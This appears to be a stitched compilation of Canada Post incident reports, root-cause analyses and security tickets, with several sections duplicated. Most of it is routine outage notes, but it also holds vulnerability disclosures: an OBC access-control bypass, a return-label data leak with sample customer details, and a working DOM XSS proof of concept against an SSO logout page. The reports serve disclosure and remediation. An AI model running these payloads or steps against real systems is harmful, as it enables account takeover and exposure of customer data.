Hi Jia Shaw,

================
When the user tries to join the developer program, behind the code it will try to add the relationship for - customerNumber, contactBPNumber, relationshipCategory: ZPWS01.

================

We need to:

- Stop the relationship from being added if there was no signup
- If the above is hard to fix, allow the signup to happen if relationship exist as a workaround solution

Available from: anytime
Amazon Billing job failing since 3-Feb-2026

Amazon billing job has been failing in Production since 3-Feb-2026 due to high data volume in DELAYED_DATA table (~411,560 records). This is resulting in an out-of-memory issue when the billing job runs. 

Application logs - 
 

We have a logic in place to verify whether a PIN is in delivered status before including it in the billing file. To check this status, we use the Track Web Service. I have observed that this service has been returning a “Multiple PIN” response, which indicates that these PINs have been reused. This is one of the root causes for data accumulation in the DELAYED_DATA table. Previously, these PINs were manually billed and removed from the database through one-time cleanup scripts.

Please note that the billing job will continue to fail until the data volume in the DELAYED_DATA table is reduced.
How many people are impacted: More than 10

Copilot notes from the technical call:

Incident Notes – DIA Scheduled Pickup Data Unavailable on PDTs
What Happened

On 25-Aug-2026, scheduled pickup information failed to load into DIA, resulting in PDT users across Canada Post being unable to view scheduled pickups. Investigation determined that the overnight RMJ publishing process, which normally runs at approximately 23:00, completed without publishing any pickup records because SAP customer validation API calls were failing during processing. As a result, the job processed zero records, no scheduled pickup data was sent to DIA, and no automated alert was generated because the job itself did not technically fail.

Timeline
Time Event~23:00 (previous evening) Scheduled pickup publishing job executed.
Overnight SAP validation API failures prevented pickup records from being published to DIA.
05:00 Business impact recognized. Scheduled pickups unavailable on PDTs.
08:39 PURS team manually triggered the required API to reprocess scheduled pickup data. Data immediately began flowing to DIA.
08:39 onward DIA confirmed pickup counts were increasing as the backlog was processed.
09:11 Reprocessing completed. Approximately 9,810 scheduled pickups were successfully sent to DIA and service was restored.
Business Impact
Scheduled pickup information was unavailable on PDT devices.

On Tuesday, April 15, 2025, at 18:12, Precision Targeter experienced an unexpected outage due to the NGINX reverse proxy service not running. The post-incident investigation revealed that the reverse proxy service went down during a scheduled maintenance window intended for renewing expiring certificates served by NGINX (Change CHG0031129). The implementation plan also did not include a step to start or verify that the reverse proxy service was running. To resolve the issue, the reverse proxy was manually restarted on Wednesday, April 16, 2025, at 09:15.

Further analysis is required to identify the specific step in the change window that may have caused the reverse proxy service to stop.
column87: Users received an error message while trying to access Precision Targeter due to the NGINX reverse proxy being in a stopped state. This issue occurred during the maintenance activity to renew expiring certificates that are served from NGINX Reverse Proxy (CHG0031129). Additionally, the implementation plan did not include a step to start or verify that the reverse proxy services were running.
column97: Support teams started the NGINX reverse proxy.

Reviewed email trigger logs for the affected period to confirm send activity and identify gaps.

Verified email logs showing successful triggers during active label creation periods. Alert count (Number of Hits: 0) aligns with no label activity during the flagged window.

The ask:
=========
Key obfuscation change to obscure APIs visibility 

Meaning - Hide API keys from all customers in the Developer Program homepage after you log in.

Background:
============
We have a current security incident actively being investigated by Security, CIO and our Product/CX team.

This note is for awareness; a more detailed briefing is being handled separately through the CIO organization. You can expect to see something formally circulated this afternoon.
 
- We are seeing a spike in fraud reports (≈15–20 customers) related to compromised business accounts and misuse of merchant API keys, resulting in unauthorized shipments billed to legitimate customers.

- Attackers appear to be accessing API keys exposed via the Developer Program and using them to generate thousands of fraudulent Xpresspost shipments. The small numbers of items inspected contained cannabis related contraband.

- It’s believed that the issue is in part due to API keys being displayed in plain-text when customers are authenticated on CPC.ca and inconsistent use of  Multi-factor Authentication (MFA).

- A CIRT call was held on March 4 at 1:30 pm to align stakeholders from Security, CIO, GTM Sales, Privacy, Legal, Corporate Communications and Product/CX.

- Immediate containment actions are underway; CIO is planning to implement a change this evening to block threat actors, but additional efforts will be required to support a permanent resolution and we will need to work with the 15-20 impacted customers.

- Further, recommendations will be brought forward suggesting updates to the current Developer Program and potentially the Developer Portal. I have connected with Sarah and she is mobilizing a team to explore the options.

- Daily CIRT calls have been scheduled and we will continue to provide updates coming from these discussions.

https://obc-cal.canadapost-postescanada.ca/

A vulnerability has been discovered in the Canada Post platform where a broken access control issue allows regular consumer users to access the Online Business Centre (OBC) tool, which should be restricted to users with business profiles only.

As per https://cpg-gpc.atlassian.net/wiki/spaces/CCMOCORE/pages/125112520250/CORE-Online+Business+Center+OBC:

"OBC is the home for number of applications which are available for the business users.( user needs to have business account in order to access OBC applications."

Steps to Reproduce
1. Login to the regular Canada Post portal:

https://www.canadapost-postescanada.ca/cpc/en/home.page

2. Navigate directly to the legacy OBC tool URL:

https://obc-cal.canadapost-postescanada.ca/


Please investigate the number of regular accounts that are accessing OBC and look for potential misuse. Please DO NOT close the ticket until evidence is provided that appropriate logging is in place. To confirm this, provide the regular user account I accessed OBC with (to test this vulnerability) and identify the misuse I performed. However, support teams were unable to identify the underlying factors contributing to the connection pool depletion.

Deloitte support team will investigate if the current connection pool value should be increased on the application instances.

Therefore, the later scan with 5:00 PM overrode the earlier 5:40 PM value.
This behavior is by design and consistent with the current EM → EDW snapshot logic. No data processing or transformation defect was identified.

As discussed , There is some intermittent behavior with Get Merchant info endpoint. when they initiate the merchant registration process, they occasionally retrieve merchant information from us with status=successful, but the API response from getMerchantRegistrationInfo contains no data. As a result, they attempt to register the merchant again.
 this seems to happen when the platform requests merchant registration info before LDAP has finished generating the data. Although LDAP returns a response status of “successful”, the data is not yet available.
Today to eliminate the problem we have asked the platforms to wait to a minimum 5 sec before retrieving the merchant registration info back when they receive a status “successful” in the return url they provided during the merchant registration process

Starting on Wednesday, July 2, 2025, at 07:00, users of the Developer Program began experiencing a "service not available" error when attempting to generate new API keys. The issue occurred due to a missing G2 certificate on the WebLogic server, which was overlooked during the XT migration. This omission resulted from insufficient landing test coverage and incomplete documentation regarding platform-specific certificate requirements. As a result, the system was unable to process new API key requests, leading to a prolonged service disruption. The issue was resolved on July 9 at 18:55 by installing the missing certificate on the WebLogic server, thereby restoring API key generation functionality.

To prevent recurrence of this issue, runbooks and Confluence documentation will be updated to include certificate requirements and landing test procedures, and landing test coverage will be enhanced.

column48:
An issue was identified on March 10 at 14:12 impacting Express Order Entry (EOE) secure users, primarily library clients such as members of the Canadian Urban Libraries Council (CULC). When multiple secure users accessed Snap Ship simultaneously via a direct URL, shipment details appeared correct on screen; however, when shipping labels were generated, the printed labels contained incorrect sender and, in some cases, receiver addresses. Inaccurate shipping rates were also intermittently displayed during the label creation process.

To mitigate risk while the issue was investigated, the team implemented a maintenance page on March 10 at 16:37 to prevent Express Order Entry (EOE) secure users from generating shipping labels that could contain incorrect information. A revised maintenance page was implemented on March 11 at 13:52 to ensure all affected access points were properly restricted. A production fix was deployed on March 11 at 18:13, validation testing concluded at 18:56, and maintenance pages were removed at 19:10. Following deployment and validation of the fix, no further incidents have been reported, and Express Order Entry label generation is functioning as expected.
column83: On March 10, an issue affected some Express Order Entry users, mainly library clients, resulting in shipping labels being printed with incorrect address information. column48:
An issue was identified on March 10 at 14:12 impacting Express Order Entry (EOE) secure users, primarily library clients such as members of the Canadian Urban Libraries Council (CULC). When multiple secure users accessed Snap Ship simultaneously via a direct URL, shipment details appeared correct on screen; however, when shipping labels were generated, the printed labels contained incorrect sender and, in some cases, receiver addresses. Inaccurate shipping rates were also intermittently displayed during the label creation process.

To mitigate risk while the issue was investigated, the team implemented a maintenance page on March 10 at 16:37 to prevent Express Order Entry (EOE) secure users from generating shipping labels that could contain incorrect information. A revised maintenance page was implemented on March 11 at 13:52 to ensure all affected access points were properly restricted. A production fix was deployed on March 11 at 18:13, validation testing concluded at 18:56, and maintenance pages were removed at 19:10. Following deployment and validation of the fix, no further incidents have been reported, and Express Order Entry label generation is functioning as expected.
column83: On March 10, an issue affected some Express Order Entry users, mainly library clients, resulting in shipping labels being printed with incorrect address information. As a precaution, access to label generation was temporarily restricted while the issue was investigated and resolved. A fix was implemented on March 11, after which normal service was restored.
column87: EOE secure users were unable to create shipping labels because incorrect session state produced wrong labels and rates. This stemmed from broken session tracking/persistence during the migration to the Snap Ship ecosystem, ultimately caused by UI navigation between payment pages that lost or corrupted session context.

Starting on November 15 at 05:00, Snap Ship, Shipping Manager, and Ship Online users could delete or edit items in their cart or address book. As a workaround for the cart issue, users could start a new shipment. As a workaround for the address book issue, users could enter the addresses manually.
These issues were related to a scheduled change over the weekend, designed to move these applications to a new environment. The change was rolled-back when issues were found in the landing tests, however, the roll-back did not resolve these issues. Unfortunately, this was not discovered until November 17.
On November 17, support teams, with assistance from IBM, determined that during the rollback of the scheduled change, a WebSeal (security appliance for web applications) reverted to its default permissions. These default settings were overly restrictive, resulting in errors when performing edit and delete operations in the cart and address book. The issue was resolved on November 17 at 18:10 after the WebSeal permissions were updated to the correct settings.

The affected asset is the canadapost-postescanada.ca domain, specifically the return label details endpoint at:

Steps to Reproduce
1. Navigate to the following URL in a browser:
https://www.canadapost-postescanada.ca/pr-rc/en/get-return-label/details?id=PR455463

2. Intercept the request using Burp Suite and send it to Repeater.
Send the request and examine the response.

3. Observe that the server response contains more sensitive data than what is displayed in the browser.

policySummary: {"contactCompanyName":"DISTRIBUTEL","contactPhone":"6132377055","customerNumber":"0001847945","policyNumber":"PR455463","policyStatus":"Active","bflfReturns":false,"additionalInfoDescEn":"Account No.","additionalInfoDescFr":"N\u00BA de compte","additionalInfoLabelEn":"Account No.","additionalInfoLabelFr":"N\u00BA de compte","inductionChannel":"Insecure","returnShippingProduct":"DOM.RP","rsaFlag":true,"rsaRequired":false,"rsaNumberRequired":false}

Impact
This vulnerability exposes sensitive company information including contact company names, phone numbers, customer numbers, and policy numbers.  An attacker could exploit this information disclosure to:

Access confidential business data that may violate data protection laws
Generate fraudulent return labels for companies, potentially causing financial costs through abuse of free return services
Use the exposed information for social engineering or other malicious activities against the affected companies


Please investigate whether this is currently being exploited. Please DO NOT close the ticket until evidence is provided of when I ran the steps to reproduce. If this cannot be determined, please create a ticket to ensure appropriate logging is put in place.

Support teams initially rolled back a recent change tied to the decommissioning of the SnapShip Express Order Entry admin tool. A third recurrence began on December 24 at 12:25, shortly after the resolution of a Priority 1 incident tracked under CPC-2025122302. By 00:57 on December 25, one DataPower appliance was upgraded to IBM’s recommended firmware, which improved performance and stability. A second appliance was upgraded shortly thereafter, and ongoing monitoring confirmed improved stability, with latency metrics remaining within acceptable thresholds. 

Following a related incident (CPC-2025123002 – Retail Sites Unable to Print Shipping Labels and Brief Disruptions to Digital Proof of Identity (DPOI)), support teams determined the internal DataPower appliance also needed a firmware update. That update was completed on January 2, and no further issues have been reported since.

On January 10 at 16:56, Canada Post customers experienced issues creating mailing orders through Electronic Shipping Tools (EST) due to mail instances being offline. While shipping services remained operational, mail-related services and tracking updates via eLink (Commport) were unavailable. Investigation revealed that two DataPower appliances (3610-C5A and 3611-C5A) were unreachable. Both appliances were physically rebooted at the data center, restoring mail instances by 20:30 and processing the eLink backlog. However, only one appliance resumed functionality, while the other remained powered on but unreachable despite multiple attempts. Support teams initiated a ticket with IBM for further troubleshooting.
On January 11, major clients such as Reitman and veryk.com reported errors when creating shipment labels. The root cause was identified as appliance 3610-C5A, which had not been powered off during previous recovery efforts and remained in a defunct state. Because it was part of a teaming configuration, the load balancer continued routing traffic to it, causing failed calls and service errors. The appliance was physically powered off at 14:54, stabilizing traffic. The second DataPower appliance was successfully brought back online on January 12 at 21:00 and has remained stable since. Support teams are continuing to closely monitor its performance to ensure ongoing reliability.

On January 10 at 16:56, Canada Post customers experienced issues creating mailing orders through Electronic Shipping Tools (EST) due to mail instances being offline. While shipping services remained operational, mail-related services and tracking updates via eLink (Commport) were unavailable. Investigation revealed that two DataPower appliances (3610-C5A and 3611-C5A) were unreachable. Both appliances were physically rebooted at the data center, restoring mail instances by 20:30 and processing the eLink backlog. However, only one appliance resumed functionality, while the other remained powered on but unreachable despite multiple attempts. Support teams initiated a ticket with IBM for further troubleshooting.
On January 11, major clients such as Reitman and veryk.com reported errors when creating shipment labels. The root cause was identified as appliance 3610-C5A, which had not been powered off during previous recovery efforts and remained in a defunct state. Because it was part of a teaming configuration, the load balancer continued routing traffic to it, causing failed calls and service errors. The appliance was physically powered off at 14:54, stabilizing traffic. The second DataPower appliance was successfully brought back online on January 12 at 21:00 and has remained stable since. Support teams are continuing to closely monitor its performance to ensure ongoing reliability.

On July 4 at 09:43, several Mail Service Providers (MSPs) reported login issues with EST 2.0. Support teams determined that the problem stemmed from customer accounts flagged for deletion in the legacy CMSS environment, which had not yet been migrated to the new XT CMSS.

On July 7 at 01:31, after successfully importing the 'marked as deleted' accounts for one customer into XT CMSS and resolving their login issue, the team proceeded to import the 'marked as deleted' customer accounts for all impacted customers.

Later on July 7, support teams saw errors in the logs indicating that some EST 2.0 customers were still having login issues. After analysing the logs, additional missing customer accounts were found. Between August 8 and August 9, multiple service disruptions impacted file uploads, shipping tools, and mail services. The first issue began on August 8 at 23:50, when Commport (eLink) was unable to upload files to SAP Event Management (EM). By August 9 at 10:03, some uploads were successful, and by 10:16, all previously failed manifests had been resent.

Shortly after, from 10:17 to 10:37 on August 9, all instances of the Electronic Shipping Tools service became unavailable due to exhaustion of the Java Database Connectivity (JDBC) connection pool. The service began to recover automatically at 10:37, and the support team performed a rolling restart to ensure full stability. The root cause of the connection pool exhaustion remains under investigation.

Later, at 14:24 on August 9, all Mail service instances failed. The support team responded promptly with a rolling restart, restoring the first instance at 14:35 and completing the process by 14:43. All services were restored and have remained stable since.

The root causes of these incidents are not yet fully understood and are under active investigation by support teams.

Starting on August 11, there was an address data discrepancy between Electronic Shipping Tools (EST) 2.0 and House Holder Elite (HHE) / Precision Targeter (PT). Support teams partially resolved the issue on August 16, but there was still a difference of about 18,000 addresses between EST 2.0 and the other systems. These discrepancies were visible to our customers when they were attempting to induct mailing campaigns, which created confusion for them, causing some of them to hold the mailing while they asked Canada Post how to proceed.

The address data discrepancy issue arose with the move from Enterprise Data Broker (EDB) to App Connect Enterprise (ACE), because the production instance of ACE was not converting the address data file properly for EST. Data issues since then were corrected manually as required. As a workaround for the current data issues, support teams manually corrected the current and pending data in EST on August 22 at 22:30. The root cause of the address data discrepancy was corrected permanently when the version of the code which was deployed & tested in the staging instance of ACE, was deployed to the production instance on the night of August 25. The September monthly run is expected to complete without issue.

On February 2, between 14:14 and 14:15, Shipping and Mailing tools—including Electronic Shipping Tools (2.0), Desktop, Developer Program, and Snap Ship—were unavailable.
 
Prior to the outage, the CMSS Product microservice, which runs on OpenShift (OCP), was intermittently reporting connection errors with SAP Event Mesh, with evidence of these issues occurring several times before 14:14. Other applications and services unrelated to the CMSS Product microservice were also experiencing connection failures to SAP Event Mesh during this period. At 14:14, the OCP readiness probes for the Product microservice began to fail. When the readiness probes failed, OpenShift restarted the affected pods (application instances). During the restart process, all pods running the Product microservice were unavailable simultaneously for approximately one minute, resulting in an outage of the Shipping and Mailing tools between 14:14 and 14:15.
 
Services recovered automatically once the pods were restarted, without any human intervention. After recovery, error logs indicated an additional connection issue between the Product microservice and SAP Event Mesh on February 2 at approximately 21:00; however, this incident did not result in an outage to Shipping and Mailing tools. Support teams will investigate the root cause of these connectivity issues.

Beginning December 23 at 17:18, eLink (Commport) reported an issue affecting order tracking visibility. While order processing continued successfully, tracking updates were not displaying as expected. Additional impacts included:

Inability for some customers to verify postal codes during Digital Proof of Identity (DPOI) verification
Issues connecting through the Developer Program, affecting label creation
Failures in external shipping, mailing, and retail applications
Most external API calls routed through Akamai to the reverse proxy and DataPower were unsuccessful, with only minimal traffic passing through
Support teams determined that the DDoS protection system was unintentionally throttling legitimate Akamai traffic due to high volume. On December 24 at 12:25, Akamai IPs were whitelisted to restore proper traffic flow. Following this change, DPOI verification, Developer Program, and eLink functionality were confirmed to be working correctly. Although the environment is now stable, some application performance issues persist and will be tracked under CPC-2025122301. Ongoing monitoring will continue to ensure system stability.
column83: On December 23 at 17:18, eLink (Commport) encountered an issue that impacted order tracking visibility, although order processing continued without disruption. The incident also affected Digital Proof of Identity (DPOI) postal code verification, Developer Program connectivity for label creation, and external shipping, mailing, and retail applications. Most external API calls routed through Akamai, the reverse proxy, and DataPower were unsuccessful, with only minimal traffic passing through. Investigation revealed that the DDoS protection system was unintentionally throttling legitimate Akamai traffic due to high volume. On December 24 at 12:25, Akamai IPs were whitelisted, restoring normal traffic flow. Following this change, DPOI verification, Developer Program, and eLink functionality were confirmed operational.
column87: The root cause was an unexpected simultaneous reload of both DataPower appliances, likely due to a firmware bug, which triggered a Radware DDoS rule and caused Akamai to increase probing traffic. This sequence led to widespread connectivity failures, as Akamai was not whitelisted, and most external API calls were unsuccessful.

Beginning December 23 at 17:18, eLink (Commport) reported an issue affecting order tracking visibility. While order processing continued successfully, tracking updates were not displaying as expected. Additional impacts included:

Inability for some customers to verify postal codes during Digital Proof of Identity (DPOI) verification
Issues connecting through the Developer Program, affecting label creation
Failures in external shipping, mailing, and retail applications
Most external API calls routed through Akamai to the reverse proxy and DataPower were unsuccessful, with only minimal traffic passing through
Support teams determined that the DDoS protection system was unintentionally throttling legitimate Akamai traffic due to high volume. On December 24 at 12:25, Akamai IPs were whitelisted to restore proper traffic flow. Following this change, DPOI verification, Developer Program, and eLink functionality were confirmed to be working correctly. Although the environment is now stable, some application performance issues persist and will be tracked under CPC-2025122301. Ongoing monitoring will continue to ensure system stability.
column83: On December 23 at 17:18, eLink (Commport) encountered an issue that impacted order tracking visibility, although order processing continued without disruption. The incident also affected Digital Proof of Identity (DPOI) postal code verification, Developer Program connectivity for label creation, and external shipping, mailing, and retail applications. Most external API calls routed through Akamai, the reverse proxy, and DataPower were unsuccessful, with only minimal traffic passing through. Investigation revealed that the DDoS protection system was unintentionally throttling legitimate Akamai traffic due to high volume. On December 24 at 12:25, Akamai IPs were whitelisted, restoring normal traffic flow. Following this change, DPOI verification, Developer Program, and eLink functionality were confirmed operational.
column87: The root cause was an unexpected simultaneous reload of both DataPower appliances, likely due to a firmware bug, which triggered a Radware DDoS rule and caused Akamai to increase probing traffic. This sequence led to widespread connectivity failures, as Akamai was not whitelisted, and most external API calls were unsuccessful.

1. Issue Summary & Business Impact

Users experienced significant latency when logging in to the Production Developer Portal. The login flow routes through WebSEAL for authentication, resulting in delayed access to the Developer Portal for end users.

 2. Diagnostics Performed

* Reviewed the Developer Portal login flow and authentication path through WebSEAL.
* Analyzed network connectivity and request routing between application components.
* Investigated potential issues impacting communication with backend authentication services.
* Identified connectivity failures affecting traffic destined for **10.35.119.251**.

 3. Root Cause (or Likely Cause)

The issue was caused by a **Wipro firewall rule blocking requests to IP address 10.35.119.251**, resulting in delays and failures in the authentication flow through WebSEAL.

 4. Resolution (What Changed)

* The issue was escalated to the Wipro networking team for investigation.
* Wipro identified and resolved the firewall configuration issue that was blocking traffic to **10.35.119.251**.
* Network connectivity was restored, allowing authentication requests to complete successfully.

5. Validation / Testing Performed

* Verified successful connectivity to **10.35.119.251** after firewall remediation.
* Performed login testing through the Production Developer Portal.
* Confirmed WebSEAL authentication completed successfully without excessive latency.
* Validated that users were able to access the Developer Portal and no further latency issues were observed.

**Closure Summary:**  
The login latency issue impacting the Production Developer Portal was traced to a Wipro firewall block on **10.35.119.251**. The firewall issue was corrected by the Wipro team, connectivity was restored, and login functionality was successfully validated end-to-end.

1. Issue Summary & Business Impact

Users experienced significant latency when logging in to the Production Developer Portal. The login flow routes through WebSEAL for authentication, resulting in delayed access to the Developer Portal for end users.

 2. Diagnostics Performed

* Reviewed the Developer Portal login flow and authentication path through WebSEAL.
* Analyzed network connectivity and request routing between application components.
* Investigated potential issues impacting communication with backend authentication services.
* Identified connectivity failures affecting traffic destined for **10.35.119.251**.

 3. Root Cause (or Likely Cause)

The issue was caused by a **Wipro firewall rule blocking requests to IP address 10.35.119.251**, resulting in delays and failures in the authentication flow through WebSEAL.

 4. Resolution (What Changed)

* The issue was escalated to the Wipro networking team for investigation.
* Wipro identified and resolved the firewall configuration issue that was blocking traffic to **10.35.119.251**.
* Network connectivity was restored, allowing authentication requests to complete successfully.

5. Validation / Testing Performed

* Verified successful connectivity to **10.35.119.251** after firewall remediation.
* Performed login testing through the Production Developer Portal.
* Confirmed WebSEAL authentication completed successfully without excessive latency.
* Validated that users were able to access the Developer Portal and no further latency issues were observed.

**Closure Summary:**  
The login latency issue impacting the Production Developer Portal was traced to a Wipro firewall block on **10.35.119.251**. The firewall issue was corrected by the Wipro team, connectivity was restored, and login functionality was successfully validated end-to-end.

1. Issue Summary & Business Impact

Users experienced significant latency when logging in to the Production Developer Portal. The login flow routes through WebSEAL for authentication, resulting in delayed access to the Developer Portal for end users.

 2. Diagnostics Performed

* Reviewed the Developer Portal login flow and authentication path through WebSEAL.
* Analyzed network connectivity and request routing between application components.
* Investigated potential issues impacting communication with backend authentication services.
* Identified connectivity failures affecting traffic destined for **10.35.119.251**.

 3. Root Cause (or Likely Cause)

The issue was caused by a **Wipro firewall rule blocking requests to IP address 10.35.119.251**, resulting in delays and failures in the authentication flow through WebSEAL.

 4. Resolution (What Changed)

* The issue was escalated to the Wipro networking team for investigation.
* Wipro identified and resolved the firewall configuration issue that was blocking traffic to **10.35.119.251**.
* Network connectivity was restored, allowing authentication requests to complete successfully.

5. Validation / Testing Performed

* Verified successful connectivity to **10.35.119.251** after firewall remediation.
* Performed login testing through the Production Developer Portal.
* Confirmed WebSEAL authentication completed successfully without excessive latency.
* Validated that users were able to access the Developer Portal and no further latency issues were observed.

**Closure Summary:**  
The login latency issue impacting the Production Developer Portal was traced to a Wipro firewall block on **10.35.119.251**. The firewall issue was corrected by the Wipro team, connectivity was restored, and login functionality was successfully validated end-to-end.

1. Issue Summary & Business Impact

Users experienced significant latency when logging in to the Production Developer Portal. The login flow routes through WebSEAL for authentication, resulting in delayed access to the Developer Portal for end users.

 2. Diagnostics Performed

* Reviewed the Developer Portal login flow and authentication path through WebSEAL.
* Analyzed network connectivity and request routing between application components.
* Investigated potential issues impacting communication with backend authentication services.
* Identified connectivity failures affecting traffic destined for **10.35.119.251**.

 3. Root Cause (or Likely Cause)

The issue was caused by a **Wipro firewall rule blocking requests to IP address 10.35.119.251**, resulting in delays and failures in the authentication flow through WebSEAL.

 4. Resolution (What Changed)

* The issue was escalated to the Wipro networking team for investigation.
* Wipro identified and resolved the firewall configuration issue that was blocking traffic to **10.35.119.251**.
* Network connectivity was restored, allowing authentication requests to complete successfully.

5. Validation / Testing Performed

* Verified successful connectivity to **10.35.119.251** after firewall remediation.
* Performed login testing through the Production Developer Portal.
* Confirmed WebSEAL authentication completed successfully without excessive latency.
* Validated that users were able to access the Developer Portal and no further latency issues were observed.

**Closure Summary:**  
The login latency issue impacting the Production Developer Portal was traced to a Wipro firewall block on **10.35.119.251**. The firewall issue was corrected by the Wipro team, connectivity was restored, and login functionality was successfully validated end-to-end.

On Wednesday, May 21, 2025, at 14:05, new users encountered login issues in the Connect application. Although a workaround was available for existing users, the support team initially intended to roll back files, including the updated sitemap. On Friday, May 23 at 11:48, the issue was resolved by fixing a script on the sign-in page. The post-incident investigation identified that during a rebrand project last year, lots of new refactored components were created and sign-in modal being one of them. Issue occurred during the project while refactoring certain dependencies into TypeScript. Testing was done for the cpc-sign modal, but a special condition specific to the Connection application (string vs. function output) was missed in the testing phase. 

Support teams will track applications that utilize CPC components for the Canada Post site (/cpc and /scp) in order to create test automation and/or support thorough manual testing.

Issue Summary & Business Impact
SnapShip JSB UI experienced a ~3-hour error spike causing failures in customer account-context lookups (Contact Of relationship between CPCID and customer), impacting SnapShip user sessions.

Reviewed AOSS logs for snapship-jsb-ui confirming error spike in "Failed to get user app by context for user". Traced the request through Datapower to the CRM backend. Root Cause
Transient failure on the CRM/Salesforce backend (zcrm_isa_checklegal SAP RFC service) returning 400 errors, propagating upstream to SnapShip JSB UI. Not a Datapower issue.

Resolution
CRM backend self-recovered. No changes required on Datapower or SnapShip side. 

Validation
AOSS logs confirmed error spike subsided and success logs resumed post-recovery. Screenshots attached.

Issue Summary & Business Impact
SnapShip JSB UI experienced a ~3-hour error spike causing failures in customer account-context lookups (Contact Of relationship between CPCID and customer), impacting SnapShip user sessions.

Diagnostics Performed
Reviewed AOSS logs for snapship-jsb-ui confirming error spike in "Failed to get user app by context for user". Traced the request through Datapower to the CRM backend. Datapower confirmed healthy — backend returning HTTP 400 Bad Request: "Backside Update Contact in SalesForce 400 Bad Request Fault" from cpccrmweb.cpggpc.ca (zcrm_isa_checklegal SAP RFC endpoint).

Root Cause
Transient failure on the CRM/Salesforce backend (zcrm_isa_checklegal SAP RFC service) returning 400 errors, propagating upstream to SnapShip JSB UI. Not a Datapower issue.

Resolution
CRM backend self-recovered. No changes required on Datapower or SnapShip side. 

Validation
AOSS logs confirmed error spike subsided and success logs resumed post-recovery. Screenshots attached.

Issue Summary & Business Impact

A customer (PluginHive, Customer #8789159) reported that although they had already joined the Developer Portal, they were unable to use the "Become a Platform" functionality. The application continued to indicate that the user had not joined the Developer Portal, preventing them from proceeding with platform enrollment.

Diagnostics Performed

Reviewed the customer's Developer Portal account status and validated their membership within the Developer Portal. Investigated the platform enablement workflow and coordinated with the business support team to verify the requirements for becoming a platform partner. Analysis confirmed that Developer Portal membership alone does not automatically grant platform status. Additional marketing attributes must be applied to the customer profile following the submission and approval of the platform enrollment request. 

Root Cause

The issue was caused by a process misunderstanding rather than a technical defect. The customer had successfully joined the Developer Portal but had not been enabled as a platform because the required marketing attribute had not been applied to their customer profile. As a result, the system correctly identified the customer as a Developer Portal member but not as an approved platform partner. 

Resolution

The customer profile was updated by manually modifying the Customer attributes enable platform status. The necessary attribute was applied, aligning the customer's profile with the platform enrollment requirements. Additionally, the business process was reviewed to clarify that customers requesting platform access must submit the appropriate request, after which Customer Front/Support applies the required marketing attribute to complete platform onboarding. 

Validation

Confirmed that the customer was successfully enabled as a platform partner and was able to proceed with platform-related functionality without further issues.

column48:
Starting at 08:21 on July 4, the Canada Post website experienced authentication-related issues that prevented customers from accessing services such as My Dashboard, My Profile, and My Shop Orders after signing in. The mobile app was also impacted.

The investigation determined that an expired security certificate within the authentication environment was the root cause. Working with IBM support, technical teams renewed the certificate and completed the necessary updates across the authentication infrastructure to ensure the new certificate was trusted throughout the environment.

Website functionality was restored at 15:00, resolving the issue affecting Canada Post online services. A related issue impacting the mobile app was subsequently resolved at 15:24, fully restoring access and functionality across both the website and mobile application.

column97:
Issue Summary & Business Impact
When trying to login to developer portal, users were being redirected to redirect url with an error stating ' no response from getCommprofile' hence no user was able to login to developer portal
 
Diagnostics Performed
Reviewed the end-to-end request flow for the Developer Portal authentication process. Confirmed that the Dev Portal obtains a token from WebSEAL, which invokes the Common Profile API through SSO-PFE and DataPower before reaching the PBE2 API. Analysis of the request revealed that the _s query parameter was being forwarded as cpcid%3D%3D<value> from DataPower to PBE2. The parameter remained URL-encoded and was not decoded prior to FIQL parsing in PBE2, resulting in request processing failures.

Root Cause
The _s  query parameter containing the FIQL filter value was URL-encoded by the upstream components and passed to PBE2 as cpcid%3D%3D<value>. Since PBE2 did not decode the parameter before FIQL parsing, the parser received an invalid expression, causing the Common Profile API request to fail.

Resolution
Implemented a fix in PBE2 to decode the _s  query parameter before FIQL parsing. This ensures that encoded values such as cpcid%3D%3D<value> are correctly converted to cpcid==<value> prior to processing. The fix was deployed and validated, restoring successful request processing through the Developer Portal authentication flow.
 
Validation
Confirmed that users are able to login to developer portal without any issues

• Impact was limited to email alert/notification processing.
• No direct outage of the SnapshipUIServices application was observed.
• Business users may have experienced delayed or missing email notifications.

• Alert was caused by an upstream/downstream dependency issue tracked under INC0374361.
• Mail and shipping services were impacted by an SSL certificate mismatch on the DataPower infrastructure.
• Root cause ownership resides with the downstream support team.
• Refer to INC0374361 for detailed RCA information.

• Reviewed and validated the monitoring alert.
• Correlated the alert with downstream incident INC0374361.

• Confirmed INC0374361 was resolved by the owning team.
• Verified customers were receiving email notifications successfully.
• Reviewed monitoring results and confirmed no active alert condition.
• Confirmed normal email processing functionality.

Preventive Measures:
• Continue monitoring for recurring email notification failures.
• Long-term corrective actions and preventive measures are owned by the downstream team under INC0374361.

column48:
A vulnerability has been discovered in the stg002-sso.epost.ca SSO logout endpoint where a DOM-based cross-site scripting (XSS) vulnerability allows attackers to execute arbitrary JavaScript in the context of the authentication gateway.

Affected Asset
The affected asset is the stg001-sso.epost.ca, stg002-sso.epost.ca, stg003-sso.epost.ca and stg004-sso.epost.ca SSO logout endpoints, specifically the /pkmslogout page with the vulnerable targetUrl parameter at:

https://stg002-sso.epost.ca/pkmslogout?targetUrl

Steps to Reproduce:

Host a malicious HTML page at any URL containing canadapost-postescanada.ca/ as a substring (e.g., using httpworkbench.com):

<html>
<head>
  <!-- Override browser Referrer-Policy to send full URL as Referer -->
  <meta name="referrer" content="unsafe-url">
</head>
<body>
  <script>
    // When victim is redirected from this page, the browser sends:
    // Referer: https://attacker.com/?x=canadapost-postescanada.ca/
    // → satisfies: ref.indexOf("canadapost-postescanada.ca/") > -1  ✓
    window.location.href =
      "https://stg002-sso.epost.ca/pkmslogout" +
      "?targetUrl=java%09script%3Aalert%28document.domain%2B%22%3Bcanadapost-postescanada.ca%2F%22%29";
  </script>
</body>
</html>


The payload in the targetUrl parameter decodes as follows:

java%09script%3Aalert%28document.domain%2B%22%3Bcanadapost-postescanada.ca%2F%22%29
URL decoded:

java    script:alert(document.domain+";canadapost-postescanada.ca/")
Send the malicious link to a victim:

https://<your-instance>.instances.httpworkbench.com/?x=canadapost-postescanada.ca/
When the victim clicks the link, they are automatically redirected to the payload URL and the XSS executes on stg002-sso.epost.ca.

Impact
This vulnerability allows arbitrary JavaScript execution in the stg002-sso.epost.ca origin. The vulnerability exploits weak substring-based domain validation and bypasses referrer header checks. Since this affects the authentication gateway, successful exploitation could lead to account takeovers through session hijacking or credential theft.

Please investigate whether there is / was active exploitation. Before closing this ticket, at minimum, identify the date and time I ran the PoC.

column48:
